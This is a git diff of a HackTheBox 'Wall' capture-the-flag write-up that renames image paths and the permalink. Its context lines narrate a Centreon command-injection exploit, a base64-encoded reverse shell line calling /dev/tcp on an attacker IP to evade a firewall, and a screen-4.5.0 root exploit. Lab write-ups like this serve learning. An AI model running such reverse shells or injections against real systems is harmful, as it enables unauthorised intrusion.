@@ -2,8 +2,8 @@
 title: Wall &#8211; HackTheBox WriteUp
 author: yakuhito
 layout: post
-permalink: wall_htb_writeup
-image: /images/wall_htb_writeup/wall_htb_writeup.png
+permalink: wall-htb-writeup
+image: /images/wall-htb-writeup/wall-htb-writeup.png
 category: htb
 ---
  
@@ -50,7 +50,7 @@ root@fury-battlestation:~/htb/blog/wall#
 There were only 2 open ports and the SSH version didn&#8217;t look old, so I started enumerating port 80. However, the site looked like no-one has ever changed it from the default:
 
 <div>
-<center><img src="/images/wall_htb_writeup/image-7.png"></center>
+<center><img src="/images/wall-htb-writeup/image-7.png"></center>
 </div>
 
 ## Dirb & Quick Grammar Lesson
@@ -88,7 +88,7 @@ root@fury-battlestation:~/htb/blog/wall#
 The `/monitoring` URI looked interesting, so I tried accessing it in a browser. Unfortunately, the page required users to login:
 
 <div>
-<center><img src="/images/wall_htb_writeup/image-8.png"></center>
+<center><img src="/images/wall-htb-writeup/image-8.png"></center>
 </div>
 
 I tried &#8216;exhaustively searching&#8217; for a valid username&password combination, but I had no success.
@@ -206,7 +206,7 @@ Content-Type: text/html; charset=iso-8859-1
 I immediately saw that the server returned `200 OK` when I tried accessing it with POST. The body of the page was very small and redirected the user to a new URI, `/centreon`:
 
 <div>
-<center><img src="/images/wall_htb_writeup/image-9.png"></center>
+<center><img src="/images/wall-htb-writeup/image-9.png"></center>
 </div>
 
 ## Exploiting centreon
@@ -278,23 +278,23 @@ root@fury-battlestation:~/htb/blog/wall#
 I used admin/password1 to log in to centreon:
 
 <div>
-<center><img src="/images/wall_htb_writeup/image-10.png"></center>
+<center><img src="/images/wall-htb-writeup/image-10.png"></center>
 </div>
 
 I found [this exploit](https://github.com/mhaskar/CVE-2019-13024/blob/master/Centreon-exploit.py) on GitHub and tried to run it, but it didn&#8217;t work, so I decided to exploit the application manually. The method of exploitation was rather easy and I followed it step-by-step to see where the exploit failed. First, I went to the poll manager and created a new poll:
 
 <div>
-<center><img src="/images/wall_htb_writeup/image-11.png"></center>
+<center><img src="/images/wall-htb-writeup/image-11.png"></center>
 </div>
 
 I used [shellgenerator.gihub.io](https://shellgenerator.github.io/) to craft a reverse shell payload. The idea was to change the &#8216;Monitoring Engine Binary&#8217; to the command(s) I wanted to be executed:<figure class="wp-block-image size-large">
 
-<center><img src="/images/wall_htb_writeup/image-12.png"></center>
+<center><img src="/images/wall-htb-writeup/image-12.png"></center>
 
 However, after clicking the &#8216;Save&#8217; button I hit&#8230; a wall:
 
 <div>
-<center><img src="/images/wall_htb_writeup/image-13.png"></center>
+<center><img src="/images/wall-htb-writeup/image-13.png"></center>
 </div>
 
 ## Tearing Down the Wall
@@ -323,7 +323,7 @@ bash -i >& /dev/tcp/10.10.15.19/443 0>&1
 I encoded the real payload with base64 just in case the firewall dropped all packets containing some specific phrases like &#8216;bash&#8217; or &#8216;/dev/tcp&#8217;. After saving the new poll, I had to activate it. I needed o know the poll id, so I clicked on my newly-created poll and looked at the URL address:
 
 <div>
-<center><img src="/images/wall_htb_writeup/image-14.png"></center>
+<center><img src="/images/wall-htb-writeup/image-14.png"></center>
 </div>
 
 The `server_id` GET parameter was the info I needed to activate the poll. I used python to craft the request:
@@ -342,7 +342,7 @@ Type "help", "copyright", "credits" or "license" for more information.
 What I forgot to mention is that the &#8216;Localhost?&#8217; option of the poll needed to be set to &#8216;Yes&#8217; for the exploit to work:
 
 <div>
-<center><img src="/images/wall_htb_writeup/image-15.png"></center>
+<center><img src="/images/wall-htb-writeup/image-15.png"></center>
 </div>
 
 The python shell hung and a reverse shell connected on port 443:
@@ -391,12 +391,12 @@ www-data@Wall:/usr/local/centreon/www$
 The &#8216;/bin/screen-4.5.0&#8217; binary was new to me, so I googled it and immediately found [an exploit](https://www.exploit-db.com/exploits/41152):
 
 <div>
-<center><img src="/images/wall_htb_writeup/image-16-1024x422.png"></center>
+<center><img src="/images/wall-htb-writeup/image-16-1024x422.png"></center>
 </div>
 
 The ExploitDB entry didn&#8217;t provide an actual working exploit, but I found [this GitHub repo that did](https://github.com/XiphosResearch/exploits/tree/master/screen2root):<figure class="wp-block-image size-large">
 
-<center><img src="/images/wall_htb_writeup/image-17-1024x423.png"></center>
+<center><img src="/images/wall-htb-writeup/image-17-1024x423.png"></center>
 
 As the script was very short, I encoded it in base64 and transferred it to the remote machine via &#8216;echo [str] | base64 -d > file&#8217;:
 
